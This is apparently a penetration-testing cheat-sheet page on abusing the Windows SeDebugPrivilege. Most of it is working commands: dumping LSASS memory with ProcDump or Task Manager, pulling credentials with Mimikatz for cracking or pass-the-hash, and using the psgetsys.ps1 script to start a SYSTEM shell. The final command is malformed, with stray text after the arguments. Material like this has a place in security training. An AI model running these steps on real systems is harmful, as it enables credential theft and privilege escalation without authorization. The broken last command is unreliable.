# SeDebugPrivilege

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:green;">`SeDebugPrivilege`</mark> allows a user to <mark style="color:purple;">**debug system processes**</mark> without being a local administrator. By default, only administrators are granted this privilege as it can be used to capture sensitive information from <mark style="color:yellow;">**system memory**</mark>, or <mark style="color:yellow;">**access/modify kernel**</mark> and application structures.

*   Assigned via **Local or Domain Group Policy**:

    <mark style="color:blue;">**`Computer Settings > Windows Settings > Security Settings`**</mark>

## <mark style="color:yellow;">Dumping LSASS</mark>

We can use <mark style="color:red;">**ProcDump**</mark> from the <mark style="color:red;">**SysInternals**</mark> suite to leverage this privilege and <mark style="color:purple;">**dump process memory**</mark>. A good candidate is the **LSASS** process, which stores user credentials after a user logs on to a system.

Or we can dump it with <mark style="color:orange;">**`Task Manager`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**->**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`Details`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**->**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`lsass.exe`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**->**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`Right-Click`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**->**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`Create dump file`**</mark>

```powershell
C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then we can use <mark style="color:red;">**Mimikatz**</mark> to extract NTLM hashes from and crack it, or use it for Pass-The-Hash attack

```powershell
C:\> mimikatz.exe
```

```
mimikatz # sekurlsa::minidump lsass.dmp
```

```cmd-session
mimikatz # sekurlsa::logonpasswords
```

## <mark style="color:yellow;">RCE as SYSTEM</mark>

We can exploit <mark style="color:green;">`SeDebugPrivilege`</mark> to achieve RCE. This method allows us to escalate privileges to **SYSTEM** by spawning a child process and leveraging the elevated rights granted through <mark style="color:green;">`SeDebugPrivilege`</mark>. By modifying standard system behavior, we can make the child process inherit the parent process's token and impersonate its privileges.

1. First we need to transfer script [**\[LINK\]**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) to target. Then we need to find a process that uses **SYSTEM:**

<pre class="language-powershell"><code class="lang-powershell"><strong>PS:\> tasklist 
</strong></code></pre>

2. After we found PID we need to use that command:

```powershell
PS:\> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "c:\windows\System32\cmd.exe", "")
```

3. Or we could use **GetProcess** cmdlet to bypass looking for PID, for example we could use lsass.exe

```powershell
PS:\> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(Get-Process "lsass".Id, "c:\windows\System32\cmd.exe", ""cd C;
```
